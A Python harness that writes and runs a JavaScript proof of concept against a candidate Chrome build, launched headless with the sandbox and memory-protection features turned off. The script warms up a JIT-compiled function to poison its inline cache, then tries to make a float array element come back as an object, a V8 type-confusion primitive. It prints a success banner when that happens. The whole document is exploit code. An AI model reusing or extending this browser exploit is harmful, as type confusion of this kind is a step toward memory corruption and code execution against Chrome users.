import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let dummy = { a: 1 };
let stable = [dummy, 2.2, 3.3];

function create_and_warmup() {
  let lines = [];
  lines.push("function sink_for_in(x, arr, obj) {");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
  lines.push(`
    arr[0] = obj;
    for (let k in obj) {
      return arr[1];
    }
    return 0;
  `);
  lines.push("}");
  lines.push("return sink_for_in;");
  let fn = new Function(lines.join("\\n"))();
  
  // 1. Transition a few fresh arrays first so IC records the transition!
  for (let i = 0; i < 10; i++) {
    let t = [1.1, 2.2, 3.3];
    fn(1000, t, dummy);
  }
  
  // 2. Warm up with stable arrays so IC is stable and hot!
  for (let i = 0; i < 20000; i++) {
    fn(i, stable, dummy);
  }
  return fn;
}

async function main() {
  let fn = create_and_warmup();
  await new Promise(r => setTimeout(r, 500));
  
  let victim = [1.1, 2.2, 3.3];
  let res = fn(1000, victim, dummy);
  console.log("RESULT: type=" + (typeof res) + " val=" + res);
  if (typeof res === "object") {
    console.log("🔥🔥🔥 SUCCESS! Object:", res, "🔥🔥🔥");
  } else {
    console.log("Still not object:", res);
  }
}
main();
</script></body></html>"""

with open("script/trans_then_stable.html", "w") as f:
    f.write(html)
profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/trans_then_stable.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()
for l in out.splitlines():
    if any(k in l for k in ["sink_for_in", "RESULT", "SUCCESS", "compil", "Still"]):
        print(l)
